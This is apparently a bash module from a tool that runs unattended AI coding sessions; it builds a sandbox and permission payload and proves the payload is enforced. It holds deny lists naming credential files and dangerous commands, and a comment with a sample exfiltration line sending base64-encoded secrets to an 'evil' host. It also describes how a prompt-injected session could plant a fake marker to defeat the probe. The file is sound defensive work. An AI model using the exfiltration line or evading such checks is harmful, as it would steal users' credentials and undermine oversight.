#!/usr/bin/env bash
# relay-settings.sh — builds the inline --settings payload and PROVES it is
# enforced before any real work runs.
#
# This is the highest-risk file in relay. Everything protecting the user's
# credentials is decided here, and `claude -p` will silently ignore a settings
# payload that fails validation (verified; see docs/security.md). A typo, or a
# schema change in a future Claude Code release, would therefore hand us a
# six-hour unattended run with NO sandbox and NO deny rules while the journal
# cheerfully reported "guardrails active".
#
# So this module never assumes. It asserts, against observable behaviour, and
# refuses to start when it cannot prove enforcement.
#
# Every sandbox key used below was empirically confirmed enforced on Claude Code
# 2.1.233 by test/lint/probe0-sandbox.sh. Keys are added here only after a probe
# demonstrates they do something.

set -u
set -o pipefail
umask 077
LC_ALL=C
IFS=$' \t\n'

# ---------------------------------------------------------------------------
# Flags relay must never pass, and must always pass.
# ---------------------------------------------------------------------------
# --dangerously-skip-permissions : would void every deny rule.
# --bare                         : skips hooks (kills the context guard) and is
#                                  reserved exclusively for --hardened mode.
# --no-session-persistence       : destroys the transcript the guard reads.
# --safe-mode                    : disables ALL customizations, including relay's
#                                  own hooks, while permissions "work normally".
#                                  It is a troubleshooting flag, not a sandbox.
# Forbidden: --dangerously-skip-permissions, --bare, --no-session-persistence,
#            --safe-mode
# Required:  --setting-sources, --strict-mcp-config
#
# Verified Critical (docs/security.md): without BOTH required flags, a cloned
# repo's .claude/settings.json hook executes and its .mcp.json loads, with no
# trust prompt, under -p.
#
# These lists live in the `case` statement in relay_settings_assert_argv rather
# than in variables. A string variable would have to be word-split to match,
# splitting behaves differently across shells, and a guard that silently
# degrades to matching nothing is worse than no guard at all.

# Paths whose contents must never be readable by sandboxed commands.
#
# Emitted with `~` expanded to $HOME rather than as a literal tilde. The
# permission-rule parser and the OS sandbox's filesystem layer are different
# code paths, and the acceptance probe only ever proved an ABSOLUTE denyRead
# path (the canary). A literal `~` that the sandbox layer does not expand would
# make this entire list inert while the probe still passed — so relay expands
# it itself and never depends on the CLI to do so.
relay_settings_default_denyread() {
  _h="${HOME:-/root}"
  cat <<EOF
$_h/.ssh
$_h/.aws
$_h/.gnupg
$_h/.config/gcloud
$_h/.kube
$_h/.docker
$_h/.npmrc
$_h/.netrc
$_h/.claude/.credentials.json
$_h/Library/Keychains
EOF
  unset _h
}

# Under `--permission-mode dontAsk`, anything not explicitly allowed is REFUSED
# rather than proceeded with — verified, probe0-permission-mode.sh case A. A
# payload carrying only a deny list therefore produces a session that cannot
# write a single file: relay's first real run spent an entire session budget
# and wrote nothing, its result envelope listing a denied Write followed by a
# denied `cat > file` Bash fallback. No mock-based test could have caught this,
# because the mock has no permission layer to get wrong.
#
# So the allow list is not a convenience — it is what makes a session able to
# work at all. Breadth here is deliberate and consistent with the threat model:
# the sandbox is the boundary, and `deny` still takes precedence over `allow`
# (case D), so the blast-radius layer below is untouched by this list.
relay_settings_default_allow() {
  cat <<'EOF'
Read
Write
Edit
Glob
Grep
Bash
BashOutput
KillShell
Task
Agent
TodoWrite
NotebookEdit
Skill
SlashCommand
EOF
}

# Blast-radius reduction for the agent's own mistakes. NOT a security boundary:
# an attacker controlling repository content defeats command-pattern matching
# trivially (absolute paths, other binaries, language runtimes, DNS,
# `git ls-remote https://evil/$(base64 secret)`). The sandbox is the boundary.
# Documented as such in the README; kept because it genuinely stops accidents.
relay_settings_default_deny() {
  cat <<'EOF'
Bash(sudo:*)
Bash(su:*)
Bash(doas:*)
Bash(rm -rf /*)
Bash(rm -rf ~*)
Bash(git push:*)
Bash(git remote:*)
Bash(git reset --hard:*)
Bash(git clean:*)
Bash(git filter-branch:*)
Bash(gh:*)
Bash(glab:*)
Bash(hub:*)
Bash(npm publish:*)
Bash(yarn publish:*)
Bash(pnpm publish:*)
Bash(cargo publish:*)
Bash(docker:*)
Bash(kubectl:*)
Bash(terraform apply:*)
Bash(aws:*)
Bash(gcloud:*)
Bash(shutdown:*)
Bash(reboot:*)
Bash(launchctl:*)
Bash(systemctl:*)
Bash(crontab:*)
Bash(at:*)
Bash(security:*)
Bash(defaults write:*)
Bash(chmod -R 777:*)
Bash(chown -R:*)
WebFetch
WebSearch
Read(~/.ssh/**)
Read(~/.aws/**)
Read(~/.gnupg/**)
Read(~/.config/gh/**)
Read(**/.env*)
Read(**/*.pem)
Read(**/id_rsa*)
Read(**/id_ed25519*)
EOF
}

# The original design denied *reads* of credential paths but left *writes*
# unguarded. Writing ~/.claude/settings.json is persistent RCE on every future
# session; writing ~/.ssh/authorized_keys is persistent host access; writing a
# shell rc is both. These close that gap.
relay_settings_default_deny_writes() {
  cat <<'EOF'
Write(~/.claude/**)
Edit(~/.claude/**)
Write(~/.ssh/**)
Edit(~/.ssh/**)
Write(~/.aws/**)
Edit(~/.aws/**)
Write(~/.zshrc)
Edit(~/.zshrc)
Write(~/.bashrc)
Edit(~/.bashrc)
Write(~/.profile)
Edit(~/.profile)
Write(~/.zprofile)
Edit(~/.zprofile)
EOF
}

# ---------------------------------------------------------------------------
# relay_settings_deny_for_mode <mode> <state_root>
# THE permission deny list, chosen by sandbox_mode. This is the ONLY place the
# trust-mode deny posture is decided — change it here and nowhere else.
#
#   enforced  the full default deny list plus the write-persistence guards,
#             emitted in exactly the order relay has always emitted them. The
#             sandbox is the real boundary; this is blast-radius reduction.
#   disabled  full-trust: there is NO sandbox, so operational commands (ssh,
#             curl, gh, docker, cloud CLIs, sudo) are all allowed. Only two
#             classes stay denied, and NEITHER is a boundary once the sandbox is
#             off — a session can `cat` or `>>` any readable path through Bash:
#               * git push / git remote — commitment #2, relay never pushes;
#               * Write/Edit-tool writes to ~/.claude, ~/.ssh, ~/.aws, shell rc
#                 files, and relay's own state files — free footgun guards that
#                 cost no operational capability (Bash bypasses them; the docs
#                 say so plainly).
# ---------------------------------------------------------------------------
relay_settings_deny_for_mode() {
  _dfm_mode="${1:-enforced}"
  _dfm_state="${2:-}"
  if [ "$_dfm_mode" = "disabled" ]; then
    cat <<'EOF'
Bash(git push:*)
Bash(git remote:*)
EOF
    relay_settings_default_deny_writes
    if [ -n "$_dfm_state" ]; then
      cat <<EOF
Write($_dfm_state/state.json)
Edit($_dfm_state/state.json)
Write($_dfm_state/config.json)
Edit($_dfm_state/config.json)
Write($_dfm_state/exec.json)
Edit($_dfm_state/exec.json)
Write($_dfm_state/journal.log)
Edit($_dfm_state/journal.log)
Write($_dfm_state/INBOX.md)
Edit($_dfm_state/INBOX.md)
Write($_dfm_state/locks/**)
Edit($_dfm_state/locks/**)
Write($_dfm_state/priv/**)
Edit($_dfm_state/priv/**)
Write($_dfm_state/run/**)
Edit($_dfm_state/run/**)
Write($_dfm_state/sessions/**)
Edit($_dfm_state/sessions/**)
Write($_dfm_state/handoffs/**)
Edit($_dfm_state/handoffs/**)
EOF
    fi
  else
    relay_settings_default_deny
    relay_settings_default_deny_writes
  fi
  unset _dfm_mode _dfm_state
}

# ---------------------------------------------------------------------------
# relay_settings_build <project_dir> <work_dir> <hook_path> [extra_domains_csv] [sandbox_mode]
# Emits the complete inline --settings JSON on stdout.
#
# The second argument is the session-WRITABLE work dir ($STATE/work), NOT the
# whole state dir. allowWrite is exactly three entries — the project, that work
# dir, and $TMPDIR (which the session's own build tools need) — so a
# prompt-injected session cannot write state.json/journal.log/exec.json/locks/
# — those live at the supervisor-only state root, one level up, out of reach.
# ---------------------------------------------------------------------------
relay_settings_build() {
  _proj="${1:?project dir required}"
  _work="${2:?work dir required}"
  _hook="${3:?hook path required}"
  _extra_domains="${4:-}"
  # enforced (default) is byte-for-byte what relay has always emitted. disabled
  # turns the OS sandbox fully off (full-trust opt-in). An unknown value is a
  # build failure, surfaced as EX_PREFLIGHT by the supervisor's braces — the
  # supervisor also validates the value first, this is the second line.
  _mode="${5:-enforced}"
  case "$_mode" in
    enforced|disabled) : ;;
    *) return 1 ;;
  esac
  # $_work is $STATE/work; its parent is the supervisor-only state root. Derived
  # by parameter expansion (fork-free, no dirname dependency). Two inputs would
  # otherwise produce confidently WRONG rules rather than none, so both are
  # handled before the strip: a trailing slash ("/s/work/") makes `%/*` yield
  # the work dir itself, and a $_work with no slash at all has no parent to name
  # and `%/*` returns it unchanged. Either way the state-file deny rules would
  # end up aimed inside the session-writable work dir while the real state files
  # one level up went unguarded. Emit no state rules at all instead.
  _state_root="$_work"
  while [ "$_state_root" != "${_state_root%/}" ]; do _state_root="${_state_root%/}"; done
  _state_root="${_state_root%/*}"
  case "$_state_root" in
    "$_work"|"") _state_root="" ;;
  esac

  # api.anthropic.com is required or the session cannot talk to the API at all.
  #
  # Assembled as lines through a pipe, not by string concatenation: command
  # substitution strips the trailing newline, so appending one $(...) to another
  # glued the first extra domain onto api.anthropic.com and destroyed BOTH
  # ("api.anthropic.comregistry.npmjs.org"). That went unnoticed because no
  # caller ever passed an extra domain. `awk '!seen'` de-duplicates while
  # preserving order, so listing api.anthropic.com again is harmless.
  _domains_json=$(
    { printf 'api.anthropic.com\n'
      if [ -n "$_extra_domains" ]; then printf '%s\n' "$_extra_domains" | tr ',' '\n'; fi
    } | grep -v '^[[:space:]]*$' | awk '!seen[$0]++' | jq -R . | jq -s .
  ) || return 1
  [ -n "$_domains_json" ] || return 1

  jq -nc \
    --arg proj "$_proj" \
    --arg work "$_work" \
    --arg hook "$_hook" \
    --arg tmp "${TMPDIR:-/tmp}" \
    --arg mode "$_mode" \
    --argjson domains "$_domains_json" \
    --argjson denyread "$(relay_settings_default_denyread | jq -R . | jq -s .)" \
    --argjson allow "$(relay_settings_default_allow | jq -R . | jq -s .)" \
    --argjson deny "$( relay_settings_deny_for_mode "$_mode" "$_state_root" | jq -R . | jq -s .)" \
    '
    {
      # ---- the actual credential protection -----------------------------
      # disabled (full-trust) mode emits ONLY {enabled:false}: no denyRead or
      # network keys, whose interaction with a switched-off sandbox is not
      # something relay has verified. enforced mode is unchanged, byte for byte.
      sandbox: (if $mode == "disabled" then {
        enabled: false
      } else {
        enabled: true,
        # Default is false, and on failure commands run UNSANDBOXED with only a
        # warning. Relay would rather not run at all.
        failIfUnavailable: true,
        # Ignore the per-call dangerouslyDisableSandbox escape hatch entirely.
        allowUnsandboxedCommands: false,
        autoAllowBashIfSandboxed: true,
        network: {
          # Deterministic deny for anything not listed, enforced at the OS
          # layer, so it also covers code relay never sees (a python urllib
          # call buried inside `npm test` is blocked exactly like curl).
          allowedDomains: $domains
        },
        filesystem: {
          allowWrite: [ $proj, $work, $tmp ],
          denyRead: $denyread
        }
      } end),
      # ---- what the session may do, and what it may never do ------------
      # `allow` exists because dontAsk refuses anything unlisted; `deny` is
      # blast-radius reduction and wins over `allow`. Both verified.
      permissions: { allow: $allow, deny: $deny },
      # ---- relay context guard, scoped to THIS session only -------------
      # Delivered per-invocation rather than registered globally, so relay
      # ships zero hooks that run in anyone else'"'"'s sessions. Exec form keeps
      # a path containing spaces from being re-parsed by a shell.
      hooks: {
        PostToolUse: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook ], timeout: 5 } ] }
        ],
        PreCompact: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook, "--precompact" ], timeout: 5 } ] }
        ]
      }
    }'
}

# ---------------------------------------------------------------------------
# relay_settings_assert_argv <argv...>
# Refuse to exec if relay ever builds a command line that voids its own
# protections. Belt to the mock test harness's braces.
# ---------------------------------------------------------------------------
relay_settings_assert_argv() {
  _seen_setting_sources=0
  _seen_strict_mcp=0
  for _a in "$@"; do
    # Matched with `case`, not by word-splitting a string variable: splitting
    # behaves differently across shells (zsh does not split unquoted
    # expansions by default), and a guard that silently degrades to "matches
    # nothing" is worse than no guard at all. This form cannot degrade.
    case "$_a" in
      --dangerously-skip-permissions|--bare|--no-session-persistence|--safe-mode)
        printf 'relay: refusing to exec: forbidden flag %s\n' "$_a" >&2
        return 1
        ;;
      --setting-sources)   _seen_setting_sources=1 ;;
      --strict-mcp-config) _seen_strict_mcp=1 ;;
    esac
  done
  if [ "$_seen_setting_sources" -ne 1 ] || [ "$_seen_strict_mcp" -ne 1 ]; then
    printf 'relay: refusing to exec: missing --setting-sources and/or --strict-mcp-config\n' >&2
    printf 'relay: without both, a repository .claude/settings.json executes under -p\n' >&2
    return 1
  fi
  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_egress_host <settings_json>
#
# Pick a host the probe can legitimately treat as "outside the allowlist".
# Almost always example.com; the candidates exist because `allow_domains` is
# user-configurable, and probing a host the user deliberately allowlisted would
# report the sandbox as broken when it is working perfectly.
# ---------------------------------------------------------------------------
relay_settings_egress_host() {
  _egh_settings="${1:-}"
  _egh_allowed=$(printf '%s' "$_egh_settings" \
    | jq -r '(.sandbox.network.allowedDomains // [])[]' 2>/dev/null)
  for _egh_c in example.com example.net example.org; do
    if ! printf '%s\n' "$_egh_allowed" | grep -qx -- "$_egh_c"; then
      printf '%s\n' "$_egh_c"
      unset _egh_settings _egh_allowed _egh_c
      return 0
    fi
  done
  unset _egh_settings _egh_allowed _egh_c
  return 1
}

# ---------------------------------------------------------------------------
# relay_settings_egress_verdict <file>
#
# Read the egress attempt's own output and print exactly one of:
#   reachable    — a non-allowlisted host answered. The sandbox is NOT confining
#                  network egress, and relay must refuse to run.
#   blocked      — the request failed, which is what an enforced allowlist looks
#                  like from inside.
#   inconclusive — the probe session did not produce a readable result (no curl
#                  on the box, the model did not run the command, a truncated
#                  file). Not proof of anything, in either direction.
#
# Kept separate from the probe itself precisely so it can be unit-tested against
# fixture files with zero API calls — the probe around it cannot be.
#
# The contract with the probe command: the file holds a line `code=<http_code>`
# and a line `rc=<curl exit status>`, each on its own line. Both are read by an
# explicit `key=` marker — NEVER by "the first three digits in the file", which
# used to misread curl's own error text ("...port 443...") as an HTTP 443 and
# flip a blocked host to `reachable`, refusing a working sandbox.
# ---------------------------------------------------------------------------
relay_settings_egress_verdict() {
  _egv_file="${1:-}"
  if [ ! -f "$_egv_file" ]; then
    printf 'inconclusive\n'
    unset _egv_file
    return 0
  fi

  _egv_rc=$(grep -o 'rc=[0-9][0-9]*' "$_egv_file" 2>/dev/null | tail -1 | cut -d= -f2)
  _egv_code=$(grep -o 'code=[0-9][0-9]*' "$_egv_file" 2>/dev/null | tail -1 | cut -d= -f2)

  case "$_egv_rc" in
    ''|*[!0-9]*)
      # No exit status means the command never ran to completion; a bare status
      # code without one is not enough to convict the sandbox.
      printf 'inconclusive\n'
      unset _egv_file _egv_rc _egv_code
      return 0
      ;;
  esac

  if [ "$_egv_rc" -eq 0 ] && [ -n "$_egv_code" ] && [ "$_egv_code" != "000" ]; then
    printf 'reachable\n'
  else
    # A non-zero curl status, or the 000 curl prints when it never got a
    # response, is the signature of a blocked connection.
    printf 'blocked\n'
  fi
  unset _egv_file _egv_rc _egv_code
  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_probe <settings_json> <scratch_dir> [model]
#
# Positively confirm the payload is enforced, in one session, by asserting two
# things the sandbox is supposed to make true:
#   * a filesystem.denyRead path is genuinely unreadable, and
#   * a host outside network.allowedDomains is genuinely unreachable.
#
# The second assertion used to be missing while this comment claimed it — the
# probe tested the canary only, so relay started six-hour unattended runs having
# proven half of what it said it proved. Found by relay auditing its own
# documentation against its own source during the phase 5 run.
#
# Asymmetry, deliberate: a readable canary and a reachable host both REFUSE the
# run, but an egress result relay cannot interpret does not. "Blocked" and "we
# could not tell" are different claims, and there is no honest way to turn the
# second into the first. `curl` is not one of relay's dependencies, so a box
# without it would otherwise be unable to run relay at all — while the canary,
# which needs nothing but the filesystem, has already proven the sandbox is on.
# The inconclusive case is journaled so it is visible rather than assumed.
#
# The canary is relay-owned scratch. The user's real credentials are never
# used as a test subject.
#
# Note there is deliberately no "control" (sandbox-off) case at runtime — that
# would mean intentionally leaking a canary on the user's machine. The control
# lives in the test suite, which proves this probe *can* observe a leak.
# ---------------------------------------------------------------------------
# Single-quote a string for safe interpolation into a shell command the model
# will run. Paths under $STATE can contain spaces (a $HOME like "/Users/John
# Smith"); an unquoted path split the redirect target, so `cat` read the wrong
# file and the netfile was never written — and the canary then looked unreadable
# for the WRONG reason while is_error stayed false, i.e. the sandbox reported
# proven having proven nothing. Every quote in the input is escaped `'\''`.
_relay_sq() {
  printf "'%s'" "$(printf '%s' "$1" | sed "s/'/'\\\\''/g")"
}

relay_settings_probe() {
  _settings="${1:?settings json required}"
  _scratch="${2:?scratch dir required}"
  _model="${3:-haiku}"

  # In disabled (full-trust) mode the sandbox is off, so this probe's two
  # assertions invert: the canary WILL be readable and a host WILL answer. The
  # question then is not "does the sandbox confine" but "was the payload
  # accepted at all" — claude -p silently ignores a payload that fails
  # validation, and a dropped payload is indistinguishable from a working
  # switched-off sandbox by reads and egress alone. Only the inline hook tells
  # them apart, so the disabled probe is a different assertion entirely.
  case "$(printf '%s' "$_settings" | jq -r '.sandbox.enabled' 2>/dev/null)" in
    false) relay_settings_probe_disabled "$_settings" "$_scratch" "$_model"; return $? ;;
  esac

  _work="$_scratch/probe-work"
  _canary="$_scratch/probe-canary.txt"
  _netfile="$_scratch/probe-egress.txt"
  _readproof="$_scratch/probe-read.out"
  # Neutral, high-entropy canary. NOT a "DO-NOT-LEAK"-labelled string: leak
  # detection must not depend on the model choosing to echo something alarming
  # back into its answer. Detection is by FILE below, not by the model's prose.
  _rand=$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -cd 'a-f0-9')
  [ -n "$_rand" ] || _rand="p$$x$(date +%s 2>/dev/null)"
  _value="relayprobe${_rand}"

  rm -rf "$_work"
  rm -f "$_netfile" "$_readproof"
  mkdir -p "$_work" || return 1
  printf '%s\n' "$_value" > "$_canary" || return 1

  _host=$(relay_settings_egress_host "$_settings") || _host=""

  # Rebuild the payload with our canary appended to denyRead, so we are testing
  # the caller's real configuration plus one observable assertion.
  _probe_settings=$(printf '%s' "$_settings" \
    | jq -c --arg c "$_canary" '.sandbox.filesystem.denyRead += [$c]') || return 1

  # Both probe commands write their OWN evidence to files the supervisor reads;
  # the verdict never depends on the model's summary. Paths are shell-quoted
  # (see _relay_sq). The canary read redirects into $_readproof: if the sandbox
  # is off, `cat` succeeds and the canary value lands in that file regardless of
  # what the model then says; if enforced, the read fails and the file holds the
  # error. The egress command writes `code=`/`rc=` lines for the verdict parser.
  _q_canary=$(_relay_sq "$_canary")
  _q_readproof=$(_relay_sq "$_readproof")
  _prompt="Use the Bash tool to run exactly: cat $_q_canary > $_q_readproof 2>&1; true"
  if [ -n "$_host" ]; then
    _q_netfile=$(_relay_sq "$_netfile")
    _prompt="$_prompt
Then use the Bash tool to run exactly: printf 'code=%s\\n' \"\$(curl -sS -m 10 https://$_host -o /dev/null -w '%{http_code}')\" > $_q_netfile 2>>$_q_netfile; printf 'rc=%s\\n' \"\$?\" >> $_q_netfile
Then reply DONE."
  else
    _prompt="$_prompt
Then reply DONE."
  fi

  (
    cd "$_work" || exit 1
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0 \
    claude -p "$_prompt" \
      --model "$_model" \
      --permission-mode dontAsk \
      --setting-sources user \
      --strict-mcp-config \
      --settings "$_probe_settings" \
      --output-format json \
      --max-budget-usd 0.10 \
      < /dev/null > "$_scratch/probe-read.json" 2> "$_scratch/probe-read.err"
  )

  # Primary leak check: the file the read command wrote. Secondary: the model's
  # own output/stderr (belt and braces). Either containing the canary means the
  # denyRead path was readable and the sandbox is not enforcing.
  if grep -qF "$_value" "$_readproof" "$_scratch/probe-read.json" "$_scratch/probe-read.err" 2>/dev/null; then
    printf 'relay: SANDBOX NOT ENFORCED — a denyRead canary was readable.\n' >&2
    printf 'relay: refusing to run. See docs/security.md.\n' >&2
    return 1
  fi

  # Confirm the sandbox actually started rather than the read merely failing
  # for an unrelated reason (missing file, model refusal, budget exhaustion).
  if ! jq -e '.is_error == false' < "$_scratch/probe-read.json" >/dev/null 2>&1; then
    printf 'relay: settings acceptance probe did not complete cleanly; refusing to run.\n' >&2
    return 1
  fi

  if [ -n "$_host" ]; then
    _egress=$(relay_settings_egress_verdict "$_netfile")
    relay_journal "probe.egress" "$_egress host=$_host"
    if [ "$_egress" = "reachable" ]; then
      printf 'relay: SANDBOX NOT ENFORCED — %s answered from inside the sandbox\n' "$_host" >&2
      printf 'relay: while network.allowedDomains does not list it.\n' >&2
      printf 'relay: refusing to run. See docs/security.md.\n' >&2
      return 1
    fi
  fi

  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_probe_disabled <settings_json> <scratch_dir> [model]
#
# The full-trust counterpart of relay_settings_probe. With the sandbox off there
# is nothing to confine, so this proves the one thing that still matters: the
# --settings payload was DELIVERED and ACCEPTED, not silently dropped for
# failing validation (which would leave a run with no hooks and no deny list
# while the journal reported "guardrails active").
#
# The proof is the inline PostToolUse hook. It writes run/hook.alive on its
# first active call, but only when RELAY_SESSION_ID is set and UUID-shaped, that
# id appears in the hook's stdin payload (the CLI puts --session-id there), and
# RELAY_DIR is an absolute dir holding a `.relay` marker. A dropped payload
# means the hook was never registered, so the marker never appears.
#
# Three assertions, each a hard refusal:
#   (a) the session completed cleanly (is_error == false);
#   (b) hook.alive exists            -> the payload was accepted;
#   (c) the canary WAS readable      -> the sandbox is genuinely off, so the
#                                       operator is not misled about the mode.
# Egress is journaled, never a refusal: reachable is the expected result here,
# and blocked/inconclusive can equally mean an offline box or no curl.
# ---------------------------------------------------------------------------
relay_settings_probe_disabled() {
  _dp_settings="${1:?settings json required}"
  _dp_scratch="${2:?scratch dir required}"
  _dp_model="${3:-haiku}"

  _dp_work="$_dp_scratch/probe-work"
  _dp_canary="$_dp_scratch/probe-canary.txt"
  _dp_netfile="$_dp_scratch/probe-egress.txt"
  _dp_readproof="$_dp_scratch/probe-read.out"

  # Hook workspace. Supplying RELAY_SESSION_ID + RELAY_DIR + the .relay marker is
  # what lets the inline hook fire during the probe (it is inert in the enforced
  # probe, which sets none of them). hook.alive lands under RELAY_DIR/run.
  _dp_sid=$(relay_uuid) || return 1
  _dp_hookdir="$_dp_scratch/probe-hook"

  _dp_rand=$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -cd 'a-f0-9')
  [ -n "$_dp_rand" ] || _dp_rand="p$$x$(date +%s 2>/dev/null)"
  _dp_value="relayprobe${_dp_rand}"

  # hook.alive is the ONLY thing separating "payload accepted" from "payload
  # silently dropped", and this scratch lives under $STATE/work, which every
  # session can write. Its freshness therefore has to be PROVEN, not assumed.
  #
  # With an unchecked `rm -rf`, it was not: a session could plant the marker and
  # chmod its parent 0555, after which `rm` fails (unlink needs write permission
  # on the containing directory) while the following `mkdir -p` and `: >` both
  # still return 0 — so setup looked clean and the next probe read a pre-planted
  # "proof", passing on a dropped payload. That is the exact outcome this
  # function exists to prevent, so both steps below are load-bearing: check the
  # removal, then assert the marker is genuinely gone.
  #
  # The name stays `hook.alive` rather than becoming per-probe random: it is a
  # fixed contract with relay-ctx.sh (:183,:187). Randomising it would buy
  # protection against a concurrent writer, and there is none — the supervisor
  # holds an exclusive run lock and no session is in flight during preflight.
  if ! rm -rf "$_dp_hookdir" 2>/dev/null || [ -e "$_dp_hookdir/run/hook.alive" ]; then
    relay_journal "probe.scratch-unclean" "$_dp_hookdir"
    printf 'relay: probe scratch could not be cleared; refusing to run.\n' >&2
    printf 'relay: a stale hook marker would be indistinguishable from proof.\n' >&2
    printf 'relay: inspect and remove: %s\n' "$_dp_hookdir" >&2
    return 1
  fi
  mkdir -p "$_dp_hookdir/run" || return 1
  : > "$_dp_hookdir/.relay" || return 1

  rm -rf "$_dp_work"
  rm -f "$_dp_netfile" "$_dp_readproof"
  mkdir -p "$_dp_work" || return 1
  printf '%s\n' "$_dp_value" > "$_dp_canary" || return 1

  _dp_host=$(relay_settings_egress_host "$_dp_settings") || _dp_host=""

  # Same prompt SHAPE as the enforced probe (so the test mock's parser matches).
  # The payload is used verbatim — with the sandbox disabled there is no
  # filesystem.denyRead to append a canary to.
  _dp_q_canary=$(_relay_sq "$_dp_canary")
  _dp_q_readproof=$(_relay_sq "$_dp_readproof")
  _dp_prompt="Use the Bash tool to run exactly: cat $_dp_q_canary > $_dp_q_readproof 2>&1; true"
  if [ -n "$_dp_host" ]; then
    _dp_q_netfile=$(_relay_sq "$_dp_netfile")
    _dp_prompt="$_dp_prompt
Then use the Bash tool to run exactly: printf 'code=%s\\n' \"\$(curl -sS -m 10 https://$_dp_host -o /dev/null -w '%{http_code}')\" > $_dp_q_netfile 2>>$_dp_q_netfile; printf 'rc=%s\\n' \"\$?\" >> $_dp_q_netfile
Then reply DONE."
  else
    _dp_prompt="$_dp_prompt
Then reply DONE."
  fi

  (
    cd "$_dp_work" || exit 1
    RELAY_SESSION_ID="$_dp_sid" RELAY_DIR="$_dp_hookdir" \
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0 \
    claude -p "$_dp_prompt" \
      --model "$_dp_model" \
      --session-id "$_dp_sid" \
      --permission-mode dontAsk \
      --setting-sources user \
      --strict-mcp-config \
      --settings "$_dp_settings" \
      --output-format json \
      --max-budget-usd 0.10 \
      < /dev/null > "$_dp_scratch/probe-read.json" 2> "$_dp_scratch/probe-read.err"
  )

  # (a) The session must have completed cleanly.
  if ! jq -e '.is_error == false' < "$_dp_scratch/probe-read.json" >/dev/null 2>&1; then
    printf 'relay: settings acceptance probe did not complete cleanly; refusing to run.\n' >&2
    return 1
  fi

  # (b) The inline hook must have fired: proof the payload was accepted.
  if [ -f "$_dp_hookdir/run/hook.alive" ]; then
    relay_journal "probe.hook" "fired mode=disabled"
  else
    relay_journal "probe.hook" "missing mode=disabled"
    printf 'relay: SETTINGS PAYLOAD NOT PROVABLY ACCEPTED — the inline hook never fired.\n' >&2
    printf 'relay: refusing to run. See docs/security.md.\n' >&2
    return 1
  fi

  # (c) The canary MUST be readable. sandbox_mode is disabled; a still-confined
  # read means the payload did not take effect as configured.
  if grep -qF "$_dp_value" "$_dp_readproof" 2>/dev/null; then
    relay_journal "probe.trust-canary" "readable mode=disabled"
  else
    relay_journal "probe.trust-canary" "unreadable mode=disabled"
    printf 'relay: sandbox_mode is disabled but reads are still confined — the payload did not take effect.\n' >&2
    printf 'relay: refusing to run. See docs/security.md.\n' >&2
    return 1
  fi

  # Egress: journal for visibility, never refuse.
  if [ -n "$_dp_host" ]; then
    _dp_egress=$(relay_settings_egress_verdict "$_dp_netfile")
    relay_journal "probe.egress" "$_dp_egress host=$_dp_host mode=disabled"
  fi

  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_fingerprint <settings_json>
# Cache key for the probe result: the payload plus the CLI version. A Claude
# Code upgrade may move the settings schema, so a version change must force a
# fresh proof rather than trusting yesterday's.
# ---------------------------------------------------------------------------
relay_settings_fingerprint() {
  _s="${1:?}"
  _v=$(claude --version 2>/dev/null | tr -cd 'A-Za-z0-9.() ')
  printf '%s\n%s\n' "$_v" "$_s" | git hash-object --stdin 2>/dev/null
}
